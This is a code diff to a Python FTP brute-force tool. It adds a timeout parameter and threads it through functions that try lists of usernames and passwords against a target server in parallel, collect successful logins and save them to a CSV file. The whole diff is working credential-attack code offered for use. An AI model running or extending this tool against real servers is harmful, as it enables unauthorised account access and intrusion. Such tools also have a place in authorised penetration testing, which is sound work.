@@ -26,12 +26,16 @@ def get_arguments(*args):
 
 port = 21
 lock = Lock()
+timeout = 1
 
-def login(ftp_server, port, user, password):
+def login(ftp_server, port, user, password, timeout):
     t1 = time()
     try:
         server = ftplib.FTP()
-        server.connect(ftp_server, port)
+        if timeout == -1:
+            server.connect(ftp_server, port)
+        else:
+            server.connect(ftp_server, port, timeout=timeout)
         server.login(user, password)
         server.close()
         t2 = time()
@@ -41,13 +45,15 @@ def login(ftp_server, port, user, password):
         return False, t2-t1
     except Exception as err:
         t2 = time()
+        if str(err) == "timed out":
+            return False, t2-t1
         return err, t2-t1
-def brute_force(thread_index, ftp_server, port, credentials):
+def brute_force(thread_index, ftp_server, port, credentials, timeout):
     successful_logins = {}
     for credential in credentials:
         status = ['']
         while status[0] != True and status[0] != False:
-            status = login(ftp_server, port, credential[0], credential[1])
+            status = login(ftp_server, port, credential[0], credential[1], timeout)
             if status[0] == True:
                 successful_logins[credential[0]] = credential[1]
                 with lock:
@@ -59,7 +65,7 @@ def brute_force(thread_index, ftp_server, port, credentials):
                 with lock:
                     display(' ', f"Thread {thread_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
     return successful_logins
-def main(server, port, credentials):
+def main(server, port, credentials, timeout):
     successful_logins = {}
     thread_count = cpu_count()
     pool = Pool(thread_count)
@@ -69,7 +75,7 @@ def main(server, port, credentials):
     credentials_count = len(credentials)
     credential_groups = [credentials[group*credentials_count//thread_count: (group+1)*credentials_count//thread_count] for group in range(thread_count)]
     for index, credential_group in enumerate(credential_groups):
-        threads.append(pool.apply_async(brute_force, (index, server, port, credential_group)))
+        threads.append(pool.apply_async(brute_force, (index, server, port, credential_group, timeout)))
     for thread in threads:
         successful_logins.update(thread.get())
     pool.close()
@@ -83,6 +89,7 @@ if __name__ == "__main__":
                               ('-u', "--users", "users", "Target Users (seperated by ',') or File containing List of Users"),
                               ('-P', "--password", "password", "Passwords (seperated by ',') or File containing List of Passwords"),
                               ('-c', "--credentials", "credentials", "Name of File containing Credentials in format ({user}:{password})"),
+                              ('-t', "--timeout", "timeout", f"Timeout for Connecting to FTP Server (Default={timeout})"),
                               ('-w', "--write", "write", "CSV File to Dump Successful Logins (default=current data and time)"))
     if not arguments.server:
         display('-', f"Please specify {Back.YELLOW}Target Server{Back.RESET}")
@@ -129,11 +136,15 @@ if __name__ == "__main__":
         except:
             display('-', f"Error while Reading File {Back.YELLOW}{arguments.credentials}{Back.RESET}")
             exit(0)
+    if arguments.timeout:
+        arguments.timeout = float(arguments.timeout)
+    else:
+        arguments.timeout = -1
     if not arguments.write:
         arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
     display('+', f"Total Credentials = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
     t1 = time()
-    successful_logins = main(arguments.server, arguments.port, arguments.credentials)
+    successful_logins = main(arguments.server, arguments.port, arguments.credentials, arguments.timeout)
     t2 = time()
     display(':', f"Successful Logins = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
     display(':', f"Total Credentials = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
